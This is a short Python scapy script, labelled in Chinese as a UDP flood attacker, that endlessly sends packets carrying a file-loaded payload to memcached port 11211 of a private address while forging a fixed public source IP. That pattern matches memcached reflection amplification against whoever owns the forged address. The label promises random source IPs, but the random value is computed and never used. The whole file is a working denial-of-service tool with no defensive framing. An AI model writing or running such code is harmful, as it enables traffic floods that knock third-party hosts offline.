#-*- coding: UTF-8 -*- 
import socket
from scapy.all import *
from scapy import all
print "这是一个UDP FLOOD攻击器，源端口源IP随机"
dip="192.168.100.152"
dp=11211
f=open('./memcache','r')
data=f.read()
while 1:
	iprandom=random.randint(0,4000000000)
	sip="123.206.115.55"
	sp=random.randint(1000,65535)
	t=64
	packet=(IP(src=sip,dst=dip,ttl=t)/UDP(sport=sp,dport=dp)/Raw(load=data))
	send(packet)
